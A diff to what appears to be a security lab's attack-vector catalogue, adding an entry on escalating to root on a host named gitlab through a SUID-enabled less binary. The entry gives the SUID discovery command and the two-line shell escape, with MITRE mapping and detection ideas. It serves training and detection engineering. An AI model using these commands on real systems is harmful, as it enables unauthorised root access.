@@ -207,6 +207,40 @@ SSH as secondary_user06 (no sudo)
 
 ---
 
+### SUID less — Shell Escape to Root (gitlab)
+
+| Field | Detail |
+|---|---|
+| **Host** | gitlab (10.2.50.15) |
+| **Entry point** | `secondary_user06` (SSH, no sudo) |
+| **Condition** | `/usr/bin/less` has SUID root bit set |
+| **Primitive** | less shell escape via `!` command executes a shell with the SUID effective UID |
+| **GTFOBins** | [less — SUID](https://gtfobins.github.io/gtfobins/less/#suid) |
+| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |
+
+**Exploit:**
+
+```bash
+less /etc/hosts
+!/bin/sh
+```
+
+**Attack path:**
+
+```
+SSH as secondary_user06 (no sudo)
+  → Discover SUID binaries: find / -perm -4000 -type f 2>/dev/null
+  → Identify /usr/bin/less with SUID root
+  → less /etc/hosts → !/bin/sh → root shell (T1548.001)
+```
+
+**Detection opportunities:**
+
+- `less` spawning `/bin/sh` as child process with euid=0 (Sysmon/auditd)
+- Shell process with effective UID 0 parented to a pager binary
+
+---
+
 ## By Technology
 
 | Technology | Vectors |
@@ -215,7 +249,7 @@ SSH as secondary_user06 (no sudo)
 | ADCS | ESC1–ESC16 certificate template misconfigurations, RDP access to CA |
 | IIS + ASP.NET + MSSQL | Web application attacks, SQL injection, authentication bypass |
 | GitLab CE | Source code exposure, CI/CD pipeline abuse, secret leakage, SUID privesc |
-| Linux (gitlab, ops) | SUID binary abuse (R, apt-get) |
+| Linux (gitlab, ops) | SUID binary abuse (R, apt-get, less) |
 | Elastic SIEM | Detection engineering, alert tuning, log analysis |
 
 ## Notes
